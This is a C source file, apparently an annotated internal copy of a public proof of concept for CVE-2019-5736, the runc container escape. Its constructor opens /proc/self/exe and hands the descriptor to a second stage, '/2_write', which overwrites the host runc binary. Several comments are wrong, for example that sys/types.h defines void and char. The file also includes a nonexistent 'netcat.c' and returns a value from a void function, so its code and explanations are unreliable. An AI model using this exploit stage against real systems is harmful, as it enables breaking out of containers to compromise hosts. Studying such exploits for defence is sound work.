/* 
 * ==========================================
 * File: 1_readonly.c
 * Author: Matthew Stacks
 * Organization: Rendition Infosec
 * Source Author: q3k
 * Description: Modified PoC of CVE-2019-5736 
 *     for internal use by Rendition Infosec 
 * ==========================================
 */

/* 
 * ==========================================
 * Header Files
 * 
 * stdio.h
 *     Defines standard I/O process streams:
 *         stdin
 *         stdout
 *         stderr
 *         null
 *     Defines these functions:
 *         printf()
 *         snprintf()
 *         get()
 *         set()
 *
 * sys/types.h
 *     Defines standard system data types:
 *         void
 *         char
 *         char *ptr
 *         int
 *     Defines __attribute__ ((constructor))
 *
 * sys/stat.h
 *     Defines the format of data returned by system calls 
 *         stat()
 *         lstat()
 *         fstat()
 *
 * fcntl.h
 *     Defines functions that act on File Descriptors:
 *         open()
 *         socket()  
 *         pipe()
 *         read()
 *         write()
 *     
 * unistd.h
 *     Provides access to the POSIX API
 *     Allows C compatibility between 
 *      POSIX, UNIX, macOS, and Linux
 *     
 * netcat.c
 *     The netcat utility
 *
 * ==========================================
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <netcat.c>

/* 
 * ================================
 * 
 * __attribute__ allows characteristics to be attached to functions
 * 
 * 
 * The (constructor) Function Attribute
 *
 *
 *
 * ================================
 */

__attribute__ ((constructor)) void foo(void)
{
    int fd = open("/proc/self/exe", O_RDONLY);
    if (fd == -1 ) {
        printf("ERR: can't open /proc/self/exe\n");
        return 0;
    }
    
/*
 * ================================
 *
 *
 *
 *
 * ================================
 */
    
    printf("File Descriptor: %d\n", fd);              /* Prints the FD of /proc/self/exe returned in line 71 */
    
    char *argv2[3];                                   /* char * is a pointer
                                                       * Whatever value argv2[3] holds, char *argv2[3] points to it */ 
    
    argv2[0] = strdup("/2_write");                    /* The first argument is duplicated to /2_write  */
    
    char buf[128];                                    /* Sets the buffer to 128 bytes.
                                                       * Allows 1_readonly.c to be compiled 
                                                       * without knowing what will be passed to it at runtime */
    
    snprintf(buf, 128, "/proc/self/fd/%d", fd);       /* */
    
    argv2[1] = buf;                                   /* Writes */
    
    argv2[2] = 0;                                     /* */
    
    execve("/2_write", argv2, NULL);                  /* */
}
